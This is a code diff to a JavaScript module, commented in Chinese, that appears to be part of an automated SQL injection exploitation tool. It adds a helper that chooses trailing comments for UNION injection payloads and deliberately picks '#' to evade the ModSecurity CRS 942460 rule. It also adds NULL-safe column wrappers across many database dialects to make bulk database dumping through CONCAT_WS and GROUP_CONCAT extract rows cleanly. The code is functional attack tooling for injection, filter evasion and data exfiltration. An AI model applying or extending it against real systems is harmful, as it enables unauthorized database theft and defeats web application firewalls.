@@ -98,6 +98,20 @@ export function resolveFromClause(dbms, unionFrom) {
   return uf ? ` FROM ${uf}` : fromDummy(dbms);
 }
 
+// ── 尾部行注释（注释掉注入点之后残留的 SQL 片段） ──────────────────────────
+// UNION 链路有两处 payload 必须以行注释结尾：门控真假探针、回显列标记探测。
+// 缺尾注时，字符串型注入点（`WHERE name = '{v}'`）末尾的引号无法闭合 → 语法错误 →
+// 探测恒 500：实测 /str、/like 的 UNION 标记探测全部 status=500，union 技术位恒 0，
+// 而数值型注入点（/num、/blind）因后面没有残留片段反而正常——典型「只在一种上下文坏」。
+// 方言差异：`#` 仅 MySQL 系认；`-- -` 是 SQL 标准（PG/MSSQL/Oracle/SQLite 均支持）。
+// tamper 开启时优先 `#`：CRS 942460 的 `\W{4}` 会把 `-- -`（4 连非词字符）判为标点异常，
+// 而 `#` 只占 1 个标点预算。tamper 关闭时两个都安全，用标准写法更稳。
+export function commentSuffix(dbms, { tamperEnabled = false } = {}) {
+  const key = String(dbms || '');
+  const supportsHash = /mysql|mariadb|tidb/i.test(key);
+  return tamperEnabled && supportsHash ? '#' : '-- -';
+}
+
 // 清洗 unionFrom 用户输入：仅保留安全字符集，防注入逃逸（'--'、'/*'、';' 等一律剔除）
 export function sanitizeUnionFrom(v) {
   if (v == null) return '';
@@ -125,6 +139,45 @@ export function escCols(cols, dialect) {
   return cols.map(wrap).join(',');
 }
 
+// ── [P0-FIX 2026-09-09] NULL 安全列表达式（CONCAT_WS 聚合拖库专用） ──────────────
+// 背景：CONCAT_WS 会**跳过 NULL 参数**——行中任一列为 NULL，该行产出的串就少一段，
+// 解析器按索引回填后整行起错位（NULL 后面的值全左移）。实测 MySQL 拖库跨行串列的根因之一。
+// 各方言用 IFNULL/ISNULL(CAST(col AS …),'') 包一层；未知方言退化为原样（保持旧行为）。
+export function escColsNN(cols, dialect) {
+  if (!Array.isArray(cols) || cols.length === 0) return '*';
+  return cols.map((c) => nnExpr(c, dialect)).join(',');
+}
+
+// [P0-FIX 2026-09-09] 同 escColsNN，但由调用方指定列间连接符。
+// 为什么需要：SQLite 拖库模板此前用 `escCols(...).replace(/,/g, ' || CHAR(31) || ')` 拼列——
+// escColsNN 引入 IFNULL(...) 后，replace 会把 IFNULL 内部的逗号也替换掉，生成非法 SQL。
+export function escColsNNJoin(cols, dialect, sep) {
+  if (!Array.isArray(cols) || cols.length === 0) return '*';
+  return cols.map((c) => nnExpr(c, dialect)).join(sep);
+}
+
+function nnExpr(col, dialect) {
+  const id = escCols([col], dialect);
+  switch (dialect) {
+    case 'MySQL': case 'TiDB': case 'MariaDB': case 'HSQLDB': case 'MonetDB':
+      return `IFNULL(CAST(${id} AS CHAR),'')`;
+    case 'SQLite':
+      return `IFNULL(CAST(${id} AS TEXT),'')`;
+    case 'PostgreSQL':
+      // PG 的 concat_ws 同样跳过 NULL 参数 → 不包 COALESCE 时 NULL 列整段丢失
+      return `COALESCE(CAST(${id} AS text),'')`;
+    case 'SQL Server':
+      // MSSQL concat_ws 对 NULL 的处理是跳过（与 PG 一致），ISNULL 兜底；nvarchar(max) 防 TRUNC
+      return `ISNULL(CAST(${id} AS nvarchar(max)),'')`;
+    case 'H2': case 'Derby':
+      return `IFNULL(CAST(${id} AS VARCHAR),'')`;
+    case 'Sybase':
+      return `ISNULL(CAST(${id} AS VARCHAR(4000)),'')`;
+    default:
+      return id;
+  }
+}
+
 // 表引用构造：MySQL/ClickHouse 带 db 前缀；其余库忽略 db（仅 schema 层语义）。
 export function tableRef(edb, db, table) {
   const t = String(table);
@@ -146,6 +199,28 @@ export function tableRef(edb, db, table) {
 export function quoteCol(c, db) {
   const dq = ['PostgreSQL', 'SQL Server', 'Oracle'].includes(resolveDbms(db));
   return dq ? `"${c}"` : `\`${c}\``;
+}
+
+// [P0-FIX 2026-09-09] CONCAT_WS 专用的 NULL 安全列引用（与 escColsNN 同一问题的堆叠路径版）。
+// Exploiter.buildStackPageSql 生成 `GROUP_CONCAT(CONCAT_WS(CHAR(31), …) SEPARATOR …)` 时，
+// 行中 NULL 列会让 concat_ws 跳过该段 → 解析按索引回填后整行左移错位。
+export function nullSafeQuoteCol(c, db) {
+  const dbms = resolveDbms(db);
+  const id = quoteCol(c, db);
+  switch (dbms) {
+    case 'SQLite':
+      return `IFNULL(CAST(${id} AS TEXT),'')`;
+    case 'PostgreSQL':
+      return `COALESCE(CAST(${id} AS text),'')`;
+    case 'SQL Server':
+      return `ISNULL(CAST(${id} AS nvarchar(max)),'')`;
+    case 'Oracle':
+      // Oracle 无 IFNULL；CAST AS VARCHAR2 防隐式类型歧义
+      return `NVL(CAST(${id} AS VARCHAR2(4000)),'')`;
+    default:
+      // MySQL/TiDB/MariaDB/H2/HSQLDB 系：IFNULL(CAST(... AS CHAR),'')
+      return `IFNULL(CAST(${id} AS CHAR),'')`;
+  }
 }
 
 // ── UNION 标记包裹 ─────────────────────────────────────────────────────────
@@ -252,6 +327,7 @@ export default {
   resolveDbms,
   fromDummy,
   resolveFromClause,
+  commentSuffix,
   sanitizeUnionFrom,
   escCols,
   tableRef,
